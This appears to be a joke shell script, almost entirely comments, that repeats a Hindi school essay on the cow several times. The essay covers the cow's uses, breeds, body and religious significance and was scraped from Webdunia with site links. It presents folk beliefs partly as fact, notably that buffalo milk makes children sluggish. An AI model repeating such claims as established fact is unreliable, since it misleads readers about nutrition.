#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा





#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#यदि समझ आ गया तो अब सो जाओ









clear
























































#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो











#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा




#गाय पर हिन्दी में निबंध


#Webdunia
